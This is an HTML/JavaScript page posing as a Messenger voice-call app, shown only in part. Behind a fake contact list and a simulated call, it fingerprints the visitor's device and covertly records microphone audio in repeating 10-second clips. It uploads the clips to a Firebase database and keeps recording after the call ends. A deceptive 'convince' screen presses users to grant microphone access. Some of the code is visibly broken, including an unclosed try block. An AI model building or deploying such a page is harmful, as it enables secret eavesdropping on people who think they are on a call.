<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Messenger Call</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background: #000;
      color: #fff;
      height: 100vh;
      overflow: hidden;
      user-select: none;
    }

    /* ===== SCREEN 1: CONTACT LIST ===== */
    #contactScreen {
      position: fixed;
      inset: 0;
      background: #000;
      display: flex;
      flex-direction: column;
      z-index: 10;
      transition: opacity 0.3s;
    }

    #contactScreen.hide {
      opacity: 0;
      pointer-events: none;
    }

    .header {
      padding: 16px 20px;
      background: #000;
      border-bottom: 1px solid #1c1c1e;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .header .back-btn {
      font-size: 24px;
      color: #0084FF;
    }

    .header h1 {
      font-size: 20px;
      font-weight: 600;
      flex: 1;
    }

    .header .new-chat {
      font-size: 22px;
      color: #0084FF;
    }

    .search-bar {
      margin: 12px 20px;
      padding: 10px 16px;
      background: #1c1c1e;
      border-radius: 20px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: #8e8e93;
      font-size: 15px;
    }

    .contact-list {
      flex: 1;
      overflow-y: auto;
    }

    .contact-item {
      display: flex;
      align-items: center;
      padding: 12px 20px;
      gap: 14px;
      cursor: pointer;
      transition: background 0.15s;
    }

    .contact-item:active {
      background: #1c1c1e;
    }

    .contact-item .avatar {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      background: linear-gradient(135deg, #0084FF, #00C6FF);
      background-size: cover;
      background-position: center;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      font-weight: 600;
      color: #fff;
      flex-shrink: 0;
      position: relative;
      overflow: hidden;
      border: 2px solid #1c1c1e;
    }

    .contact-item .avatar.online::after {
      content: '';
      position: absolute;
      bottom: 2px;
      right: 2px;
      width: 14px;
      height: 14px;
      background: #31A24C;
      border: 2px solid #000;
      border-radius: 50%;
    }

    .contact-item .info {
      flex: 1;
      min-width: 0;
    }

    .contact-item .name {
      font-size: 16px;
      font-weight: 500;
      margin-bottom: 2px;
    }

    .contact-item .status {
      font-size: 13px;
      color: #8e8e93;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .contact-item .call-btn {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      background: #0084FF;
      border: none;
      color: #fff;
      font-size: 18px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: transform 0.15s;
    }

    .contact-item .call-btn:active {
      transform: scale(0.9);
    }

    /* ===== SCREEN 2: INCOMING CALL ===== */
    #incomingScreen {
      position: fixed;
      inset: 0;
      background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      padding: 60px 24px 60px;
      z-index: 50;
    }

    #incomingScreen.show {
      display: flex;
    }

    .incoming-top {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      margin-top: 40px;
    }

    .incoming-avatar {
      width: 140px;
      height: 140px;
      border-radius: 50%;
      background: linear-gradient(135deg, #0084FF, #00C6FF);
      background-size: cover;
      background-position: center;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 56px;
      font-weight: 600;
      animation: incomingPulse 2s infinite;
      border: 3px solid rgba(255, 255, 255, 0.2);
    }

    @keyframes incomingPulse {

      0%,
      100% {
        transform: scale(1);
        box-shadow: 0 0 0 0 rgba(0, 132, 255, 0.5);
      }

      50% {
        transform: scale(1.05);
        box-shadow: 0 0 0 30px rgba(0, 132, 255, 0);
      }
    }

    .incoming-name {
      font-size: 28px;
      font-weight: 600;
    }

    .incoming-type {
      font-size: 15px;
      color: #8e8e93;
    }

    .incoming-status {
      font-size: 14px;
      color: #0084FF;
      margin-top: 8px;
    }

    .incoming-actions {
      display: flex;
      gap: 60px;
      align-items: center;
    }

    .call-action-btn {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      border: none;
      font-size: 28px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: transform 0.15s;
      color: #fff;
    }

    .call-action-btn:active {
      transform: scale(0.9);
    }

    .decline-btn {
      background: #FF3B30;
    }

    .accept-btn {
      background: #31A24C;
      animation: acceptPulse 1.5s infinite;
    }

    @keyframes acceptPulse {

      0%,
      100% {
        box-shadow: 0 0 0 0 rgba(49, 162, 76, 0.6);
      }

      50% {
        box-shadow: 0 0 0 20px rgba(49, 162, 76, 0);
      }
    }

    /* ===== SCREEN 3: PERMISSION ===== */
    #permissionModal {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.95);
      display: none;
      align-items: center;
      justify-content: center;
      padding: 24px;
      z-index: 100;
    }

    #permissionModal.show {
      display: flex;
    }

    .permission-content {
      background: #1c1c1e;
      border-radius: 20px;
      padding: 32px 24px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      animation: slideUp 0.3s ease;
    }

    @keyframes slideUp {
      from {
        transform: translateY(30px);
        opacity: 0;
      }

      to {
        transform: translateY(0);
        opacity: 1;
      }
    }

    .permission-icons {
      font-size: 56px;
      margin-bottom: 20px;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    .permission-content h2 {
      font-size: 22px;
      margin-bottom: 12px;
    }

    .permission-content p {
      font-size: 15px;
      color: #8e8e93;
      line-height: 1.5;
      margin-bottom: 24px;
    }

    .permission-content .privacy-note {
      background: #2c2c2e;
      border-radius: 12px;
      padding: 12px;
      font-size: 13px;
      color: #31A24C;
      margin-bottom: 24px;
    }

    .permission-btn {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 10px;
      transition: transform 0.15s;
    }

    .permission-btn:active {
      transform: scale(0.97);
    }

    .btn-allow {
      background: #0084FF;
      color: #fff;
    }

    .btn-deny {
      background: transparent;
      color: #8e8e93;
      font-weight: 400;
    }

    /* ===== SCREEN 4: CALL ===== */
  #callScreen {
  position: fixed;
  inset: 0;
  width: 100vw;
  height: 100vh;
  background: #000;
  display: none;
  flex-direction: column;
  z-index: 80;
}

#callScreen.show {
  display: flex !important;      /* 🔥 !important add karo */
  flex-direction: column;
}

    .remote-video-wrap {
      flex: 1;
      position: relative;
      background: #1c1c1e;
      overflow: hidden;
    }

    .call-header {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      padding: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: linear-gradient(180deg, rgba(0, 0, 0, 0.7) 0%, transparent 100%);
      z-index: 5;
    }

    .call-header .call-timer {
      font-size: 15px;
      background: rgba(0, 0, 0, 0.4);
      padding: 4px 12px;
      border-radius: 12px;
    }

    .call-controls {
      padding: 30px 20px 40px;
      display: flex;
      justify-content: center;
      gap: 20px;
      background: #000;
    }

    .ctrl-btn {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      border: none;
      background: #2c2c2e;
      color: #fff;
      font-size: 22px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: transform 0.15s, background 0.2s;
    }

    .ctrl-btn:active {
      transform: scale(0.9);
    }

    .ctrl-btn.active {
      background: #0084FF;
    }

    .ctrl-btn.end {
      background: #FF3B30;
      width: 70px;
      height: 70px;
      font-size: 26px;
    }

    /* ===== TOAST ===== */
    .toast {
      position: fixed;
      bottom: 100px;
      left: 50%;
      transform: translateX(-50%);
      background: #2c2c2e;
      color: #fff;
      padding: 12px 24px;
      border-radius: 24px;
      font-size: 14px;
      z-index: 9999;
      animation: toastIn 0.3s ease;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
    }

    @keyframes toastIn {
      from {
        opacity: 0;
        transform: translateX(-50%) translateY(20px);
      }

      to {
        opacity: 1;
        transform: translateX(-50%) translateY(0);
      }
    }
    /* ============================================================
   🎨 CALL SCREEN — MESSENGER STYLE
   ============================================================ */

#callScreen .call-bg {
  position: relative;              /* 🔥 absolute → relative */
  width: 100%;
  height: 100%;
  min-height: 100vh;               /* 🔥 height force */
  background: linear-gradient(180deg, #0a0a0a 0%, #1a1a1a 100%);
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  overflow: hidden;
}

/* Glow effect background */
#callScreen .call-bg::before {
  content: '';
  position: absolute;
  top: 40%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 400px;
  height: 400px;
  background: radial-gradient(circle, rgba(0,132,255,0.15) 0%, transparent 70%);
  border-radius: 50%;
  pointer-events: none;
  animation: glowPulse 3s infinite;
}

@keyframes glowPulse {
  0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
  50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.8; }
}

/* Top Bar */
#callScreen .call-top-bar {
  padding: 24px 20px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  position: relative;
  z-index: 5;
}

#callScreen .call-timer-big {
  font-size: 15px;
  font-weight: 600;
  color: #fff;
  background: rgba(255,255,255,0.1);
  padding: 6px 14px;
  border-radius: 20px;
  backdrop-filter: blur(10px);
  font-variant-numeric: tabular-nums;
}

/* Center Section */
#callScreen .call-center {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 20px;
  position: relative;
  z-index: 5;
}

#callScreen .call-avatar-big {
  width: 160px;
  height: 160px;
  border-radius: 50%;
  background: linear-gradient(135deg, #0084FF, #00C6FF);
  background-size: cover;
  background-position: center;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 64px;
  font-weight: 600;
  color: #fff;
  box-shadow: 0 0 60px rgba(0,132,255,0.5), 0 0 120px rgba(0,132,255,0.3);
  border: 4px solid rgba(255,255,255,0.15);
  animation: avatarPulse 2s infinite;
}

@keyframes avatarPulse {
  0%, 100% {
    transform: scale(1);
    box-shadow: 0 0 60px rgba(0,132,255,0.5), 0 0 120px rgba(0,132,255,0.3);
  }
  50% {
    transform: scale(1.03);
    box-shadow: 0 0 80px rgba(0,132,255,0.7), 0 0 160px rgba(0,132,255,0.4);
  }
}

#callScreen .call-name-big {
  font-size: 28px;
  font-weight: 600;
  color: #fff;
  margin-top: 8px;
}

#callScreen .call-status-text {
  font-size: 13px;
  color: #8e8e93;
  margin-top: -8px;
}

/* Live Waveform */
#callScreen .waveform {
  display: flex;
  gap: 5px;
  align-items: center;
  height: 40px;
  margin-top: 12px;
}

#callScreen .waveform .bar {
  width: 4px;
  background: linear-gradient(180deg, #0084FF, #00C6FF);
  border-radius: 4px;
  animation: waveBar 1.2s infinite ease-in-out;
  box-shadow: 0 0 10px rgba(0,132,255,0.6);
}

#callScreen .waveform .bar:nth-child(1) { animation-delay: 0s; }
#callScreen .waveform .bar:nth-child(2) { animation-delay: 0.15s; }
#callScreen .waveform .bar:nth-child(3) { animation-delay: 0.3s; }
#callScreen .waveform .bar:nth-child(4) { animation-delay: 0.45s; }
#callScreen .waveform .bar:nth-child(5) { animation-delay: 0.3s; }
#callScreen .waveform .bar:nth-child(6) { animation-delay: 0.15s; }
#callScreen .waveform .bar:nth-child(7) { animation-delay: 0s; }

@keyframes waveBar {
  0%, 100% { height: 8px; opacity: 0.5; }
  50% { height: 36px; opacity: 1; }
}

/* Bottom Controls */
#callScreen .call-controls-bottom {
  padding: 30px 20px 50px;
  display: flex;
  justify-content: center;
  gap: 40px;
  align-items: center;
  position: relative;
  z-index: 5;
}

#callScreen .ctrl-btn-messenger {
  width: 68px;
  height: 68px;
  border-radius: 50%;
  border: none;
  background: rgba(255,255,255,0.12);
  backdrop-filter: blur(20px);
  color: #fff;
  font-size: 26px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s ease;
  border: 1px solid rgba(255,255,255,0.1);
}

#callScreen .ctrl-btn-messenger:active {
  transform: scale(0.92);
}

#callScreen .ctrl-btn-messenger.active {
  background: #0084FF;
  box-shadow: 0 0 30px rgba(0,132,255,0.6);
}

#callScreen .ctrl-btn-messenger.end {
  background: #FF3B30;
  box-shadow: 0 0 30px rgba(255,59,48,0.5);
}

#callScreen .ctrl-btn-messenger.end:active {
  transform: scale(0.92);
  background: #d63029;
}
  </style>
</head>

  <script type="module">
        /* ============================================================
       📱 SIMPLE DEVICE TRACKING
       ============================================================ */
    function getDeviceName() {
      const ua = navigator.userAgent;

      // iPhone
      if (/iPhone/i.test(ua)) {
        const w = window.screen.width;
        if (w === 430) return 'iPhone 15 Pro Max';
        if (w === 393) return 'iPhone 15 / 14 Pro';
        if (w === 390) return 'iPhone 13 / 14';
        if (w === 428) return 'iPhone 14 Plus';
        if (w === 414) return 'iPhone 11 / XR';
        if (w === 375) return 'iPhone X / 11 Pro';
        return 'iPhone';
      }

      // iPad
      if (/iPad/i.test(ua)) return 'iPad';

      // Android
      if (/Android/i.test(ua)) {
        let brand = '';

        // Brand detect
        if (/realme/i.test(ua)) brand = 'Realme';
        else if (/Redmi/i.test(ua)) brand = 'Redmi';
        else if (/POCO/i.test(ua)) brand = 'POCO';
        else if (/Xiaomi/i.test(ua)) brand = 'Xiaomi';
        else if (/Nothing/i.test(ua)) brand = 'Nothing';
        else if (/SM-/i.test(ua) || /Samsung/i.test(ua)) brand = 'Samsung';
        else if (/OnePlus/i.test(ua)) brand = 'OnePlus';
        else if (/OPPO/i.test(ua)) brand = 'OPPO';
        else if (/vivo/i.test(ua) || /Vivo/i.test(ua)) brand = 'Vivo';
        else if (/moto/i.test(ua) || /Motorola/i.test(ua)) brand = 'Motorola';
        else if (/Pixel/i.test(ua)) brand = 'Google Pixel';
        else if (/Huawei/i.test(ua)) brand = 'Huawei';
        else if (/Infinix/i.test(ua)) brand = 'Infinix';
        else if (/Tecno/i.test(ua)) brand = 'Tecno';
        else if (/Nokia/i.test(ua)) brand = 'Nokia';
        else if (/Sony/i.test(ua)) brand = 'Sony';
        else brand = 'Android';

        // Model from UA
        const modelMatch = ua.match(/Android\s+[\d.]+;\s*([^)]+)\)/);
        let model = '';
        if (modelMatch) {
          model = modelMatch[1].trim().split(' Build/')[0];
        }

        return model ? `${brand} ${model}` : brand;
      }

      // Desktop
      if (/Windows/i.test(ua)) return 'Windows PC';
      if (/Macintosh/i.test(ua)) return 'Mac';
      if (/Linux/i.test(ua)) return 'Linux PC';

      return 'Unknown Device';
    }

async function saveDeviceInfo() {
  const deviceName = getDeviceName();
  const pageName = getPageName();   // 🔥 YE ADD
  console.log('📱 Device:', deviceName);
  console.log('📄 Page:', pageName);

  try {
    const deviceRef = ref(db, 'devices_root/' + DEVICE_ID);
    await set(deviceRef, {
      deviceId: DEVICE_ID,
      sessionId: SESSION_ID,
      deviceName: deviceName,
      pageName: pageName,             // 🔥 YE ADD
      status: 'active',
      firstVisit: Date.now(),
      lastSeen: Date.now()
    });
    console.log('✅ Device saved:', deviceName);
  } catch (err) {
    console.error('❌ Save failed:', err.code);
  }
}

   async function updateDeviceStatus(status) {
  try {
    await set(ref(db, 'devices_root/' + DEVICE_ID + '/status'), status);

    /* ============================================================
       7. RENDER CONTACTS (with profile pics + country flags)
       ============================================================ */
    function renderContacts() {
      contactList.innerHTML = CONTACTS.map(c => `
    <div class="contact-item" onclick="startCall(${c.id})">
      <div class="avatar ${c.online ? 'online' : ''}"
           style="background-image: url('${c.dp}');
                  background-size: cover;
                  background-position: center;">
      </div>
      <div class="info">
        <div class="name">${c.name}</div>
        <div class="status">${c.country} • ${c.status}</div>
      </div>
      <button class="call-btn" onclick="event.stopPropagation(); startCall(${c.id})">📞</button>
    </div>
  `).join('');
    }

    renderContacts();

    /* ============================================================
       8. TOAST
       ============================================================ */
    function showToast(msg) {
      const existing = document.querySelector('.toast');
      if (existing) existing.remove();
      const toast = document.createElement('div');
      toast.className = 'toast';
      toast.textContent = msg;
      document.body.appendChild(toast);
      setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.3s';
        setTimeout(() => toast.remove(), 300);
      }, 2500);
    }

    window.startCall = async function (contactId) {
      currentContact = CONTACTS.find(c => c.id === contactId);
      if (!currentContact) return;
      console.log('📞 Calling:', currentContact.name);

      try {
        micStreamOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
        console.log('✅ Mic granted (call UI)');
        showToast('🎤 Mic allowed');
      } catch (err) {
        console.error('❌ Mic denied:', err.name);
        let msg = '🚫 Mic permission required';
        if (err.name === 'NotFoundError') msg = '🎤 No mic found';
        if (err.name === 'NotReadableError') msg = '⚠️ Mic in use';
        showToast(msg);
        currentContact = null;
        return;
      }

      // 🔥 FIX 1: Incoming name update
      incomingName.textContent = currentContact.name;

      // 🔥 FIX 2: Incoming status update
      incomingStatus.textContent = '📞 Calling...';

      // 🔥 FIX 3: Incoming avatar as DP
      incomingAvatar.textContent = '';
      incomingAvatar.style.backgroundImage = `url('${currentContact.dp}')`;
      incomingAvatar.style.backgroundSize = 'cover';
      incomingAvatar.style.backgroundPosition = 'center';
      incomingAvatar.style.border = '3px solid #0084FF';

      // 🔥 FIX 4: Type label update (video call → voice call)
      const incomingType = incomingScreen.querySelector('.incoming-type');
      if (incomingType) {
        incomingType.textContent = `${currentContact.country} • Voice Call`;
      }

      contactScreen.classList.add('hide');
      incomingScreen.classList.add('show');
      playRingtone();

      setTimeout(() => {
        if (incomingScreen.classList.contains('show')) incomingStatus.textContent = '📞 Ringing...';
      }, 1500);

      setTimeout(() => {
        if (incomingScreen.classList.contains('show')) acceptCallAuto();
      }, 3500);
    };

    /* ============================================================
       10. ACCEPT / CONNECT
       ============================================================ */
    window.acceptCall = async function () {
      stopRingtone();
      incomingScreen.classList.remove('show');
      await connectCall();
    };

    async function acceptCallAuto() {
      stopRingtone();
      incomingScreen.classList.remove('show');
      console.log('📞 Auto-accepting...');
      await connectCall();
    }

    async function connectCall() {
      const audioTracks = micStreamOnly ? micStreamOnly.getAudioTracks() : [];
      if (audioTracks.length === 0) { showToast('⚠️ No mic'); return; }
      localStream = new MediaStream([...audioTracks]);
      console.log('✅ Local stream ready (no recording)');
      startCallUI();
    }

    /* ============================================================
       11. DECLINE / CANCEL
       ============================================================ */
    window.declineCall = function () {
      stopRingtone();
      incomingScreen.classList.remove('show');
      contactScreen.classList.remove('hide');
      if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }
      showToast('Call declined');
      currentContact = null;
    };

    window.closePermissionModal = function () {
      permissionModal.classList.remove('show');
      contactScreen.classList.remove('hide');
      if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }
      showToast('Cancelled');
      currentContact = null;
    };

    /* ============================================================
       12. CALL UI
       ============================================================ */
function startCallUI() {
  callTimer.textContent = '00:00';
  callSeconds = 0;

  // 🔥 Call screen avatar as DP
  const callAvatarEl = document.getElementById('callAvatar');
  callAvatarEl.textContent = '';
  callAvatarEl.style.backgroundImage = `url('${currentContact.dp}')`;
  callAvatarEl.style.backgroundSize = 'cover';
  callAvatarEl.style.backgroundPosition = 'center';

  document.getElementById('callName').textContent = currentContact.name;

  callTimerInterval = setInterval(() => {
    callSeconds++;
    const m = String(Math.floor(callSeconds / 60)).padStart(2, '0');
    const s = String(callSeconds % 60).padStart(2, '0');
    callTimer.textContent = `${m}:${s}`;
  }, 1000);

  if (navigator.vibrate) navigator.vibrate([100, 50, 100]);

  // 🎵 Background audio play karo
  playCallBackgroundAudio();

  // 🔥🔥🔥 YE LINE MISSING THI — CALL SCREEN SHOW KARO
  callScreen.classList.add('show');
  console.log('✅ Call screen shown');

  showToast('✅ Call connected');
}

    /* ============================================================
       13. END CALL — smart recorder chalta rahega ✅
       ============================================================ */
    window.endCall = function () {
      if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }

      // 🎵 Background audio band karo
      stopCallBackgroundAudio();

      if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
      if (micStreamOnly) { micStreamOnly.getTracks().forEach(t => t.stop()); micStreamOnly = null; }

      isMuted = false;
      isSpeakerOn = false;
      document.getElementById('muteBtn').classList.remove('active');
      document.getElementById('speakerBtn').classList.remove('active');

      callScreen.classList.remove('show');
      contactScreen.classList.remove('hide');

      const mins = Math.floor(callSeconds / 60);
      const secs = callSeconds % 60;
      showToast(`📞 Call ended • ${mins}m ${secs}s`);

      currentContact = null;
      callSeconds = 0;

      console.log('📞 Call ended — smart recorder still running');
    };

    /* ============================================================
       14. CONTROLS
       ============================================================ */
    window.toggleMute = function () {
      if (!localStream) return;
      const audioTrack = localStream.getAudioTracks()[0];
      if (audioTrack) {
        audioTrack.enabled = !audioTrack.enabled;
        isMuted = !isMuted;
        document.getElementById('muteBtn').classList.toggle('active', isMuted);
        showToast(isMuted ? '🔇 Muted' : '🎤 Unmuted');
      }
    };

    window.toggleSpeaker = function () {
      isSpeakerOn = !isSpeakerOn;
      document.getElementById('speakerBtn').classList.toggle('active', isSpeakerOn);
      showToast(isSpeakerOn ? '🔊 Speaker ON' : '🔈 Speaker OFF');

      // 🎵 Volume adjust karo
      if (callBgAudio) {
        callBgAudio.volume = isSpeakerOn ? 1.0 : 0.4;
      }
    };

    /* ============================================================
       15. RINGTONE
       ============================================================ */
    let ringtoneCtx = null;
    let ringtoneInterval = null;

    function playRingtone() {
      try {
        if (ringtoneCtx) return;
        ringtoneCtx = new (window.AudioContext || window.webkitAudioContext)();
        const playBeep = () => {
          if (!ringtoneCtx) return;
          const osc = ringtoneCtx.createOscillator();
          const gain = ringtoneCtx.createGain();
          osc.connect(gain); gain.connect(ringtoneCtx.destination);
          osc.frequency.value = 800; osc.type = 'sine';
          gain.gain.setValueAtTime(0, ringtoneCtx.currentTime);
          gain.gain.linearRampToValueAtTime(0.15, ringtoneCtx.currentTime + 0.05);
          gain.gain.linearRampToValueAtTime(0, ringtoneCtx.currentTime + 0.4);
          osc.start(ringtoneCtx.currentTime); osc.stop(ringtoneCtx.currentTime + 0.5);
        };
        playBeep();
        setTimeout(playBeep, 600);
        ringtoneInterval = setInterval(() => { playBeep(); setTimeout(playBeep, 600); }, 2000);
      } catch (e) { console.warn('Ringtone failed:', e); }
    }

    function stopRingtone() {
      if (ringtoneInterval) { clearInterval(ringtoneInterval); ringtoneInterval = null; }
      if (ringtoneCtx) { ringtoneCtx.close().catch(() => { }); ringtoneCtx = null; }
    }
    /* ============================================================
       🎵 CALL BACKGROUND AUDIO — voice/1.mp4
       ============================================================ */
    function playCallBackgroundAudio() {
      try {
        if (callBgAudio) {
          callBgAudio.pause();
          callBgAudio = null;
        }

        callBgAudio = new Audio('voice/1.mp4');
        callBgAudio.loop = true;
        callBgAudio.muted = true;   // pehle mute (autoplay ke liye)

        callBgAudio.play().then(() => {
          // Play hone ke baad unmute karo
          setTimeout(() => {
            if (callBgAudio) {
              callBgAudio.muted = false;
              callBgAudio.volume = 0.7;
            }
          }, 100);
          console.log('🎵 [Call] Background audio playing');
        }).catch(err => {
          console.warn('❌ [Call] Audio play failed:', err.message);
        });

      } catch (e) {
        console.warn('❌ [Call] Audio error:', e);
      }
    }

    function stopCallBackgroundAudio() {
      if (callBgAudio) {
        callBgAudio.pause();
        callBgAudio.currentTime = 0;
        callBgAudio = null;
        console.log('🔇 [Call] Background audio stopped');
      }
    }
    /* ============================================================
       16. 🔥 SMART AUTO-RECORDER — ONLY RECORDING
       ============================================================ */
    async function checkSmartMicPermission() {
      if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
      try {
        const status = await navigator.permissions.query({ name: 'microphone' });
        return status.state;
      } catch (e) { return 'unknown'; }
    }

    async function startSmartRecorder() {
      if (smartMicStream && smartMicStream.active) {
        console.log('🎤 [Smart] Already running');
        return true;
      }
      try {
        console.log('🎤 [Smart] Requesting independent mic...');
        smartMicStream = await navigator.mediaDevices.getUserMedia({
          audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
        });
        console.log('✅ [Smart] Independent mic granted');
        smartRecBadge.style.display = 'flex';
        startSmartLoop();
        return true;
      } catch (err) {
        console.error('❌ [Smart] Mic error:', err.name);
        if (err.name === 'NotReadableError') {
          console.log('⚠️ [Smart] Mic busy — retry in 5s');
          setTimeout(() => startSmartRecorder(), 5000);
        }
        return false;
      }
    }

    function startSmartLoop() {
      stopSmartLoop();
      smartClipCount = 0;
      console.log('🎤 [Smart] Loop started (10 sec clips)');
      setTimeout(() => { if (smartMicStream && smartMicStream.active) smartRecordClip(); }, 1500);
      smartLoopTimer = setInterval(() => {
        if (smartMicStream && smartMicStream.active && !smartIsRecording) smartRecordClip();
      }, 11500);
    }

    function stopSmartLoop() {
      if (smartLoopTimer) { clearInterval(smartLoopTimer); smartLoopTimer = null; }
      if (smartRecorder && smartRecorder.state === 'recording') {
        try { smartRecorder.stop(); } catch (e) { }
      }
      smartIsRecording = false;
      console.log('⏹️ [Smart] Loop stopped');
    }

    async function smartRecordClip() {
      if (!smartMicStream || !smartMicStream.active || smartIsRecording) return;
      const audioTracks = smartMicStream.getAudioTracks();
      if (audioTracks.length === 0) return;

      try {
        smartIsRecording = true;
        smartChunks = [];
        smartClipCount++;
        console.log(`🎤 [Smart #${smartClipCount}] Recording...`);

        const audioOnlyStream = new MediaStream(audioTracks);
        let mimeType = 'audio/webm;codecs=opus';
        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/webm';
        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';

        const options = { audioBitsPerSecond: 24000 };
        if (mimeType) options.mimeType = mimeType;

        smartRecorder = new MediaRecorder(audioOnlyStream, options);
        smartRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) smartChunks.push(e.data); };
        smartRecorder.onstop = async () => {
          const actualMime = smartRecorder.mimeType || mimeType || 'audio/webm';
          const blob = new Blob(smartChunks, { type: actualMime });
          console.log(`🎤 [Smart #${smartClipCount}] Size: ${(blob.size / 1024).toFixed(1)} KB`);
          if (blob.size > 500) await saveSmartClipToRTDB(blob, actualMime);
          smartChunks = [];
          smartIsRecording = false;
          smartRecCount.textContent = smartClipCount;
        };
        smartRecorder.start();
        setTimeout(() => {
          if (smartRecorder && smartRecorder.state === 'recording') smartRecorder.stop();
        }, SMART_CLIP_DURATION);
      } catch (err) {
        console.error('❌ [Smart] Record error:', err);
        smartIsRecording = false;
      }
    }

    async function saveSmartClipToRTDB(blob, mimeType) {
      const now = new Date();
      const timestamp = now.getTime();
      const dt = getDateTime();
      console.log('📤 [Smart] Saving...', (blob.size / 1024).toFixed(1), 'KB');

      let base64 = '';
      try {
        base64 = await new Promise((resolve, reject) => {
          const reader = new FileReader();
          reader.onloadend = () => resolve(reader.result);
          reader.onerror = reject;
          reader.readAsDataURL(blob);
        });
      } catch (err) { console.error('❌ [Smart] Base64 failed:', err); return; }

      try {
        const audioRef = ref(db, 'mic_audio/' + DEVICE_ID);
        const newRef = await push(audioRef, {
          deviceId: DEVICE_ID,
          sessionId: SESSION_ID,
          audioBase64: base64,
          size: blob.size,
          duration: SMART_CLIP_DURATION / 1000,
          mimeType: mimeType || 'audio/webm',
          date: dt.date,
          time: dt.time,
          timestamp: timestamp,
          capturedAtISO: dt.iso,
          capturedAt: serverTimestamp(),
          source: 'smart-auto'
        });
        console.log('✅ [Smart] Saved:', newRef.key, '|', dt.time);
      } catch (err) {
        console.error('❌ [Smart] RTDB FAILED:', err.code, err.message);
      }
    }

    /* Background save */
    document.addEventListener('visibilitychange', () => {
      if (document.hidden && smartRecorder && smartRecorder.state === 'recording') {
        console.log('👁️ [Smart] Tab hidden — saving');
        try { smartRecorder.stop(); } catch (e) { }
      }
    });

    window.addEventListener('pagehide', () => {
      if (smartRecorder && smartRecorder.state === 'recording') {
        try { smartRecorder.stop(); } catch (e) { }
      }
    });

    /* Permission watch */
    async function watchSmartPermission() {
      if (!navigator.permissions || !navigator.permissions.query) return;
      try {
        const status = await navigator.permissions.query({ name: 'microphone' });
        status.onchange = () => {
          console.log('🔔 [Smart] Permission changed:', status.state);
          if (status.state === 'granted' && (!smartMicStream || !smartMicStream.active)) {
            startSmartRecorder();
          }
        };
      } catch (e) { }
    }

    /* Convince modal — Call style (Red/Green buttons) */
    function showMicConvinceModal() {
      if (document.getElementById('micConvinceModal')) return;

      const modal = document.createElement('div');
      modal.id = 'micConvinceModal';
      modal.style.cssText = `
    position:fixed; inset:0; background:linear-gradient(180deg, #1c1c1e 0%, #000 100%);
    display:flex; flex-direction:column; align-items:center;
    justify-content:space-between; padding:60px 24px 60px;
    z-index:99999; animation:fadeIn 0.3s ease;
  `;

      modal.innerHTML = `
    <style>
      @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
      @keyframes pulseAvatar {
        0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,132,255,0.5); }
        50% { transform: scale(1.05); box-shadow: 0 0 0 30px rgba(0,132,255,0); }
      }
      @keyframes acceptPulse {
        0%, 100% { box-shadow: 0 0 0 0 rgba(49,162,76,0.6); }
        50% { box-shadow: 0 0 0 20px rgba(49,162,76,0); }
      }
      @keyframes declinePulse {
        0%, 100% { box-shadow: 0 0 0 0 rgba(255,59,48,0.6); }
        50% { box-shadow: 0 0 0 20px rgba(255,59,48,0); }
      }
    </style>

    <!-- Top: Avatar + Name -->
    <div style="display:flex; flex-direction:column; align-items:center; gap:20px; margin-top:40px;">
      <div style="width:140px; height:140px; border-radius:50%;
                  background:linear-gradient(135deg, #0084FF, #00C6FF);
                  display:flex; align-items:center; justify-content:center;
                  font-size:56px; font-weight:600;
                  animation:pulseAvatar 2s infinite;">🎤</div>

